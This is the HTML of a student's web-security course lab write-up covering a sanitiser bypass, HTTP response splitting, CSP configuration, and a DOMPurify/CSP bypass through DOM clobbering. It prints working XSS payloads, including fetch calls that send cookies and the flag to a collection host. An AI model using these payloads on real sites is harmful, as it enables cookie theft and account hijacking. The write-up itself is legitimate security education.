+<span class=kd>let</span> <span class=nx>blacklisted_attribs</span> <span class=o>=</span> <span class=p>[</span>
+    <span class=sr>/^on.*/i</span><span class=p>,</span>
+<span class=p>];</span>
+
+<span class=kd>let</span> <span class=nx>sanitize</span> <span class=o>=</span> <span class=p>(</span><span class=nx>parent</span><span class=p>,</span> <span class=nx>el</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+    <span class=c1>// Let&#39;s do our magic here!
+</span><span class=c1></span>
+    <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s1>&#39;Analysing&#39;</span><span class=p>,</span> <span class=nx>el</span><span class=p>);</span>
+
+    <span class=k>if</span> <span class=p>(</span><span class=nx>blacklisted_tags</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=nx>el</span><span class=p>.</span><span class=nx>tagName</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>()))</span> <span class=p>{</span>
+        <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s1>&#39;Bad element, deleting&#39;</span><span class=p>,</span> <span class=nx>el</span><span class=p>);</span>
+
+        <span class=nx>parent</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>el</span><span class=p>);</span>
+
+        <span class=k>return</span><span class=p>;</span>
+    <span class=p>}</span>
+
+    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>el</span><span class=p>.</span><span class=nx>attributes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kd>let</span> <span class=nx>attr</span> <span class=o>=</span> <span class=nx>el</span><span class=p>.</span><span class=nx>attributes</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
+
+        <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>battr</span> <span class=k>of</span> <span class=nx>blacklisted_attribs</span><span class=p>)</span> <span class=p>{</span>
+            <span class=k>if</span> <span class=p>(</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=p>.</span><span class=nx>search</span><span class=p>(</span><span class=nx>battr</span><span class=p>)</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+                <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=sb>`Removing </span><span class=si>${</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=si>}</span><span class=sb> from`</span><span class=p>,</span> <span class=nx>el</span><span class=p>);</span>
+                <span class=nx>el</span><span class=p>.</span><span class=nx>removeAttribute</span><span class=p>(</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>
+
+                <span class=k>continue</span><span class=p>;</span>
+            <span class=p>}</span>
+
+            <span class=c1>// Check if the src begins with javascript
+</span><span class=c1></span>
+            <span class=k>if</span> <span class=p>(</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span> <span class=o>===</span> <span class=s1>&#39;src&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>attr</span><span class=p>.</span><span class=nx>value</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>().</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;javascript:&#39;</span><span class=p>)</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+                <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s1>&#39;Dangerous src detected, sanitising&#39;</span><span class=p>,</span> <span class=nx>attr</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>
+
+                <span class=nx>attr</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+            <span class=p>}</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+
+    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>child</span> <span class=k>of</span> <span class=nx>el</span><span class=p>.</span><span class=nx>children</span><span class=p>)</span> <span class=p>{</span>
+        <span class=nx>sanitize</span><span class=p>(</span><span class=nx>el</span><span class=p>,</span> <span class=nx>child</span><span class=p>);</span>
+    <span class=p>}</span>
+
+    <span class=k>return</span> <span class=nx>el</span><span class=p>;</span>
+<span class=p>};</span>
+
+<span class=k>try</span> <span class=p>{</span>
+    <span class=kd>let</span> <span class=nx>template</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;template&#39;</span><span class=p>);</span>
+
+    <span class=nx>template</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>contents</span><span class=p>;</span>
+
+    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>root</span> <span class=k>of</span> <span class=nx>template</span><span class=p>.</span><span class=nx>content</span><span class=p>.</span><span class=nx>children</span><span class=p>)</span> <span class=p>{</span>
+        <span class=nx>sanitize</span><span class=p>(</span><span class=nx>template</span><span class=p>.</span><span class=nx>content</span><span class=p>,</span> <span class=nx>root</span><span class=p>);</span>
+    <span class=p>}</span>
+
+    <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>template</span><span class=p>.</span><span class=nx>innerHTML</span><span class=p>;</span>
+<span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
+    <span class=nx>div</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s1>&#39;Failed to parse report, XSS protection activated!&#39;</span><span class=p>;</span>
+    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;jokes they probably fucked up their js&#39;</span><span class=p>,</span> <span class=nx>e</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div><p>Glancing through, it goes through each tag element in the payload, and performs some checks.</p><ul><li>Removes any <code>&lt;script&gt;</code> tags</li><li>Removes any <code>&lt;object&gt;</code> tags</li><li>Removes attributes that start with <code>on</code> (i.e. <code>onerror</code>, <code>onload</code>)</li><li>Do it recursively for any child tags</li></ul><p>But!!!!<br>There&rsquo;s a flaw in the code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></pre></td><td class=lntd><pre class=chroma>let blacklisted_attribs = [
+    /^on.*/i,
+];
+
+...
+
+for (let battr of blacklisted_attribs) { ... }</pre></td></tr></table></div></div><p><code>blacklisted_attribs</code> only contains a single item; meaning that the <code>for</code> loop will only find and remove the first <code>on*</code> attribute.</p><p>We can easily circumvent this by adding a dummy attribute before our Javascript exploit, by using the <code>&lt;img&gt;</code> tag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>a</span> <span class=na>on</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(&#39;XSS!&#39;)&lt;/img</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>POSTing this payload as the <code>content</code>, then viewing the page with the ID from the cookie; our Javascript successfully executes!</p><p>Now we can just do a <code>fetch</code> with the <code>document.cookie</code>! Right?</p><p>Nup.</p><p>Since the HTTP Only option is set, we need to somehow get the flag into somewhere accessible&hellip;</p><p>Having a look at the response headers when viewing <code>/view/f85b9762-e7db-4223-aefd-e2fc6739e4c9</code>, there exists an <code>X-Meta</code> header which contains the title of our report&hellip; Hmm I wonder if it&rsquo;s sanitised&hellip;<br>On the following line is the Set-Cookie flag header</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></pre></td><td class=lntd><pre class=chroma>X-Meta: target=a; time=2020-07-21 01:31:16.361953
+Set-Cookie: flag=bm8gZmxhZyBmb3IgeW91; Path=/; HttpOnly; Secure
+
+&lt;RESPONSE BODY&gt;</pre></td></tr></table></div></div><blockquote><p><em>Hmm I wonder if it&rsquo;s sanitised&hellip;</em></p></blockquote><p>Surely enough, it&rsquo;s not - this is where HTTP Response splitting comes in!</p><p>If we add <code>\r\n\r\n</code> to our payload title, it will cause the <code>Set-Cookie</code> header line to be part of the response body.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></pre></td><td class=lntd><pre class=chroma>X-Meta: target=a
+
+; time=2020-07-21 01:31:16.361953                       &lt;-------- Response body starts here
+Set-Cookie: flag=bm8gZmxhZyBmb3IgeW91; Path=/; HttpOnly; Secure
+
+&lt;RESPONSE BODY&gt;</pre></td></tr></table></div></div><p>Our page now contains the base64 flag, which is now trivial to extract and send off to our request listener.</p><p>Payload Title: <code>a\r\n\r\n</code><br>Payload Content: <code>&lt;img on=alert(1) onerror=fetch(&quot;https://my.collection.site?x=&quot;+/flag=.+?;/.exec(document.body.innerHTML)[0]) src=a&gt;</code></p><p><em>Note: I used some regex to extract the flag string: <code>/flag=.+?;/.exec(document.body.innerHTML)[0]</code></em></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=csp>CSP</h2><h3 id=challenge-1>Challenge 1</h3><p>Site: csp.-QBSITE-/csp.html</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></pre></td><td class=lntd><pre class=chroma># CSP Headers :: Before
+default-src &#39;none&#39;;
+script-src &#39;self&#39; ssl.google-analytics.com;
+style-src &#39;self&#39; maxcdn.bootstrapcdn.com fonts.googleapis.com;
+font-src fonts.gstatic.com maxcdn.bootstrapcdn.com;
+img-src &#39;self&#39; ssl.google-analytics.com</pre></td></tr></table></div></div><p>If we have an inline script that does not have a <code>nonce</code> tag, we can add its hash into the <code>script-src</code> CSP headers: &lsquo;sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc=&rsquo;</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p>For scripts with a <code>nonce</code>, we can add that into the <code>script-src</code> CSP headers: &lsquo;nonce-2726c7f26c&rsquo;</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p>For the <code>unsplash.it</code> image, it requires three hosts to be allowed: &lsquo;unsplash.it picsum.photos i.picsum.photos&rsquo;</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></pre></td><td class=lntd><pre class=chroma># CSP Headers :: After
+default-src &#39;none&#39;;
+script-src &#39;self&#39; ssl.google-analytics.com &#39;sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc=&#39; &#39;nonce-2726c7f26c&#39;;
+style-src &#39;self&#39; maxcdn.bootstrapcdn.com fonts.googleapis.com;
+img-src &#39;self&#39; ssl.google-analytics.com unsplash.it picsum.photos i.picsum.photos;
+font-src fonts.gstatic.com maxcdn.bootstrapcdn.com</pre></td></tr></table></div></div><h3 id=challenge-2>Challenge 2</h3><p>Site: csp.-QBSITE-/csp-quotes.html</p><p>Can&rsquo;t use hashes to allow scripts!</p><p>The <code>quote-loader.js</code> dynamically inserts the <code>get-quote.js</code> script into the page; however only if the <code>strict-dynamic</code> source directive is added.</p><blockquote><p>COMP6443{-flag-redacted-}`</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></pre></td><td class=lntd><pre class=chroma>CSP Headers :: Before
+default-src &#39;none&#39;;
+script-src &#39;nonce-onyDVMyUbCMVPCJc7AaTdA==&#39; &#39;self&#39; ssl.google-analytics.com;
+style-src &#39;self&#39; maxcdn.bootstrapcdn.com fonts.googleapis.com;
+img-src &#39;self&#39; ssl.google-analytics.com;
+font-src fonts.gstatic.com maxcdn.bootstrapcdn.com</pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></pre></td><td class=lntd><pre class=chroma># CSP Headers :: After
+default-src &#39;none&#39;;
+script-src &#39;nonce-onyDVMyUbCMVPCJc7AaTdA==&#39; &#39;self&#39; ssl.google-analytics.com &#39;strict-dynamic&#39;;
+style-src &#39;self&#39; maxcdn.bootstrapcdn.com fonts.googleapis.com;
+img-src &#39;self&#39; ssl.google-analytics.com;
+font-src fonts.gstatic.com maxcdn.bootstrapcdn.com</pre></td></tr></table></div></div><h2 id=support-v2>Support V2</h2><p><em>This challenge took me 5 days, in 4 sittings to get. BUT I FINALLY DID IT.</em></p><p>Site: support-v2.-QBSITE-</p><p>Unlike <code>support.-QBSITE-</code>, this challenge has nothing to do with any base58 or IDOR enumeration.<br>Instead we&rsquo;re met with Content Security Policy roadblocks and sandboxed <code>iframes</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>Content-Security-Policy: script-src &#39;unsafe-eval&#39; &#39;strict-dynamic&#39; &#39;nonce-...&#39;; base-uri &#39;none&#39;; object-src &#39;none&#39;</pre></td></tr></table></div></div><p>CSP Level 3 (<code>strict-dynamic</code>) is employed here, allowing only verified scripts to be executed.</p><ul><li>Material Design Lite (1.3.0)</li><li>JQuery (3.5.1)</li><li>DOMPurify (2.0.12)<br></li></ul><p>All these libraries are the latest version (time of writing) - and do not have any <em>reported</em> vulnerabilities.</p><ul><li>The ticket body is encoded as b64, and is securely decoded with <code>atob</code>.</li><li>The <code>iframe</code> on the page has the <code>sandbox</code> attribute set without the <code>allow-scripts</code> permission. This will prevent any code from running inside the frame</li><li>Resources in an <code>iframe</code> inherit the CSP regulations of that frame&rsquo;s source as well as its parents</li><li>The page employs a <code>DOMPurify</code> script, that will strip away <s>every possible</s> most XSS payloads<ul><li>We either need to find an undetected pattern in DOMPurify, or bypass the library</li></ul></li></ul><p>The contents inside <code>/report/[ticketID].js</code> (<em>Line 8</em>) can be tampered with by modifying the <code>ticketID</code>. However CSP is strictly set to <code>nonce</code> verification, rather than any <code>self</code> origin - and there doesn&rsquo;t seem to be any way to tamper with the headers</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-js data-lang=js><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-js data-lang=js><span class=c1>// jquery is too hard. i copied this random piece of code from stackoverflow
+</span><span class=c1>// it seems to be working. i don&#39;t know why, but at least it works
+</span><span class=c1>// why was javascript invented
+</span><span class=c1></span><span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span>
+  <span class=nx>sandbox</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;tk&#34;</span><span class=p>).</span><span class=nx>contentWindow</span><span class=p>;</span>
+  <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
+  <span class=nx>div</span><span class=p>.</span><span class=nx>setAttribute</span><span class=p>(</span><span class=s2>&#34;id&#34;</span><span class=p>,</span> <span class=s2>&#34;rp&#34;</span><span class=p>);</span>
+  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;Found an issue? &lt;a href=\&#34;/report/[TICKETID]\&#34;&gt;Report this page to admin&lt;/a&gt;&#34;</span><span class=p>;</span>
+  <span class=nx>sandbox</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
+  <span class=nx>$</span><span class=p>(</span><span class=nx>sandbox</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>).</span><span class=nx>prepend</span><span class=p>(</span><span class=nx>sandbox</span><span class=p>.</span><span class=nx>rp</span><span class=p>);</span>
+<span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
+</code></pre></td></tr></table></div></div><p>So let&rsquo;s summarise our issues</p><ul><li>CSP - strict-dynamic, nonce-based, iframe inheritance</li><li>Libraries - Up to date, secure (ish)</li><li>Ticket Body - Stored and decoded securely</li><li>DOMPurify - Sanitisation of XSS</li><li>iframe - Sandbox w/o script execution</li></ul><p>The first attack vector we can find is the <strong>ticket title</strong>.<br>The contents of the title are reflected verbosely into the response HTML, giving us partial control of the DOM.<br>It does however have a maximum length of 35 characters; not a lot, but enough!</p><p>The title is located before the import of DOMPurify library and the sanitisation routine.<br>By injecting a <code>&lt;script&gt;</code> tag as the title, we render the HTML <code>script</code> tag which loads DOMPurify, as part of the Javascript code. This causes a CSP error, but more importantly - we&rsquo;ve manipulated the DOM and prevented DOMPurify from loading!</p><p>The inline code block then decrypts the base64 ticket body and attempts to sanitise it.<br>However as we&rsquo;ve removed DOMPurify from the page, the sanitisation fails and the script continues (thanks to the <code>try catch</code> block). This will cause the <code>srcdoc</code> of the iframe to contain an unsanitised ticket body!</p><p>But hang on&hellip; Our iframe code been nulled from our <code>&lt;script&gt;</code> injection, and it had sandboxing policies!<br>Well, since we&rsquo;ve nulled it, we add a new iframe into our DOM, <em>without</em> the sandbox!<br>We can control references to <code>#tk</code> to point to our new &lsquo;freed&rsquo; <code>iframe</code>!</p><p>Our header payload ends up as both the iframe and script opening tag.<br>It&rsquo;s 31 characters long, and so will fit the 35 character limit!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>id</span><span class=o>=</span><span class=s>tk</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;&lt;</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>With the header payload injected, we can see that the site looks exactly the same - except now our ticket body payload is executable and XSS-able!</p><p>The next issue to face is bypassing CSP protection. Hm.</p><p>To execute a script, the script must contain the <code>nonce</code> value that is dynamically generated with each page visit.<br>With the ticket title payload, we could possibly keep the opening script tag unclosed, such that the <code>nonce</code> value inside the DOMPurify script tag would be added as an attribute - <em>however</em> due to the structure of the elements this wasn&rsquo;t possible.</p><p>An <code>iframe</code> inherits the CSP policies of the parent document, meaning a resource (i.e script) must conform to the iframe&rsquo;s CSP policy, the iframe&rsquo;s parent&rsquo;s CSP policy, the iframe&rsquo;s parent&rsquo;s parent&rsquo;s CSP policy and so forth&hellip;<br>So executing a script in the <code>iframe</code> would not be possible, without already having access to Javascript to insert the nonce.</p><p>The other way would be DOM Clobbering.</p><p>Some HTML elements allow us to override DOM properties.<br><s>Horrible right?</s> Cool right!?</p><ul><li><code>&lt;a&gt;</code> tags resolve to their <code>href</code> value<ul><li>i.e. <code>&lt;a id=id href=abc&gt;</code> will cause <code>id + 'def' = 'abcdef'</code></li></ul></li><li>Tags with the same id will return a HTML Collection when accessed by their id<ul><li>i.e. <code>&lt;a id=a&gt;&lt;a id=a name=b href=data&gt;</code></li><li><code>a</code> -&gt; [a, a]</li><li><code>a.b</code> -&gt; data</li></ul></li><li><code>&lt;form&gt;</code> tags allow us to build a multilevel dictionary</li><li><code>&lt;iframe srcdoc=...&gt;</code> tags allow us to access HTML structures</li><li><code>&lt;img&gt;</code> tags allow us to override <code>document.cookie</code> and <code>document.body</code></li></ul><p><strong>Read More</strong></p><ul><li><a href=https://portswigger.net/web-security/dom-based/dom-clobbering>https://portswigger.net/web-security/dom-based/dom-clobbering</a></li><li><a href=https://portswigger.net/research/dom-clobbering-strikes-back>https://portswigger.net/research/dom-clobbering-strikes-back</a></li><li><a href="https://lmgtfy.com/?q=DOM+Clobbering">Even more</a></li></ul><p>Cool, so we can perform DOM Clobbering. But on what?<br>Our requirements of DOM Clobbering is to not cause any Javascript syntax or runtime errors, so we won&rsquo;t be able to clobber the majority of the Javascript code.</p><p>&hellip;</p><p>This is where we go hackerman mode, and start auditing source code of libraries.</p><p><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/d8328f77-2bec-4a20-9483-ea76dd62985e/dan31sc-80f18518-0ef0-4bdc-9c0a-11c9e62b769f.png/v1/fill/w_1192,h_670,q_70,strp/hackerman_by_shiiftyshift_dan31sc-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3siaGVpZ2h0IjoiPD0xMDgwIiwicGF0aCI6IlwvZlwvZDgzMjhmNzctMmJlYy00YTIwLTk0ODMtZWE3NmRkNjI5ODVlXC9kYW4zMXNjLTgwZjE4NTE4LTBlZjAtNGJkYy05YzBhLTExYzllNjJiNzY5Zi5wbmciLCJ3aWR0aCI6Ijw9MTkyMCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.iBlOitqc4h2_YWFaG3IUb-UQ1MGU-V_M0azcwUwGUSI" alt></p><p>Remember when I said that the libraries used in the site were up to date and secure?<br>Yeah well, they&rsquo;re <em>relatively</em> secure.</p><p>There&rsquo;s a JQuery vulnerability test site <a href=http://research.insecurelabs.org/jquery/test/>here</a> which reports JQuery 3.5.1 as safe against previously reported vulnerabilities. But ironically, JQuery is the library we are going to audit, because of the <code>unsafe-eval</code> directive in the CSP headers.</p><p><code>unsafe-eval</code> allows Javascript to be executed through <code>eval</code>.<br>JQuery requires this in order to perform it&rsquo;s DOM manipulation functions - when a <code>&lt;script&gt;</code> tag is added to the DOM via JQuery, the <code>nonce</code> values are appended automatically!</p><p>The only JQuery code occurence that may have a attack vector possibility is inside the helper script.<br><code>$(sandbox.document.body).prepend(sandbox.rp);</code></p><p>Hm, the <code>.prepend()</code> function&hellip; Let&rsquo;s take a look at that</p><blockquote><p>Now&rsquo;s a good idea to open your Developer Tools, get another 3 monitors and fire up Burp Suite.</p></blockquote><p>Knowing that our end goal is to get Javascript execution from a <code>&lt;script&gt;</code> tag inside our ticket body, we can create our test payload</p><p>Title Payload - <code>&lt;iframe id=tk&gt;&lt;/iframe&gt;&lt;script&gt;</code><br>Body Payload - <code>&lt;script&gt;alert('pwned!')&lt;/script&gt;</code></p><p>We can then take a look at the JQuery script through the debugger in our Developer Tools.</p><blockquote><p>I recommend setting up Burp to change .min.js references to their verbose .js files</p></blockquote><p>The overall structure of the prepend function (concerning our exploit) is</p><ul><li><code>prepend()</code> function is called</li><li><code>domManip()</code> function is called</li><li><code>buildFragment()</code> function is called</li><li>Checks are done, and scripts are possibly executed</li></ul><p>By setting breakpoints around crucial code segments, we find the following requirements</p><ul><li>A <code>&lt;script&gt;</code> tag must exist</li><li><code>domManip:first</code> must be truthy (<code>fragment.firstChild</code>)</li><li><code>!dataPriv.access(node, &quot;globalEval&quot;)</code> must evaluate to <code>true</code><ul><li><code>dataPriv.access(node, &quot;globalEval&quot;)</code> must evaluate to <code>false</code></li></ul></li><li><code>buildFragment:attached</code> must evaluate to <code>false</code> (<code>isAttached(elem)</code>)</li></ul><p>Upon inspecting the state of the function, we find that <code>attached</code> evalutes to <code>true</code>, which prevents the script from being executed.</p><p>The <code>isAttached</code> function checks if <code>elem</code> is inside <code>elem.ownerDocument</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></pre></td><td class=lntd><pre class=chroma># Expected DOM state for propery isAttached functionality
+
+&lt;root / elem.ownerDocument&gt;
+  &lt;elem&gt;</pre></td></tr></table></div></div><p>So <strong><em>finally</em></strong>, to break this check we can perform DOM Clobbering and create a separate element that can be identified as <code>ownerDocument</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></pre></td><td class=lntd><pre class=chroma># Desired DOM state for forced isAttached functionality
+
+&lt;root&gt;
+  &lt;elem&gt;
+    &lt;ownerDocument&gt;</pre></td></tr></table></div></div><p>As <code>elem.ownerDocument</code> is a child of <code>elem</code>, it will <em>not</em> contain <code>elem</code>!</p><p>We can form our payload as such</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>rp</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>ownerDocument</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;pwned!&#39;</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>And tada! We&rsquo;ve gotten Javascript execution!</p><p>From here it&rsquo;s a simple task of sending off the <code>document.cookie</code> value to our endpoint.</p><hr><p><strong>Ticket Title Payload</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>&lt;iframe id=tk&gt;&lt;/iframe&gt;&lt;script&gt;</pre></td></tr></table></div></div><p><strong>Ticket Body Payload</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>rp</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>ownerDocument</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://my.collection.site?x=&#39;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p><strong>et cetera</strong></p><ul><li>I set up my Burp Suite to change minified scripts to their verbose version - making debugging via the developer tools MUCH easier.</li><li>CSP can be set via a <code>&lt;meta&gt;</code> tag<ul><li><a href=https://content-security-policy.com/examples/meta>Reading material</a></li><li>This tag must appear in the <code>&lt;head&gt;</code> of a page</li></ul></li><li>The DOM is confusing</li></ul></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../../post/cross-origin-same-origin/><i class="iconfont icon-left"></i><span class="prev-text nav-default">Same and Cross Origin Policy</span>
+<span class="prev-text nav-mobile">Prev</span></a>
+<a class=next href=../../../post/tut7/><span class="next-text nav-default">Tutorial 7 Notes</span>
+<span class="next-text nav-mobile">Next</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
+<span class=division>|</span>
+<span class=theme-info>Theme -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
+2020
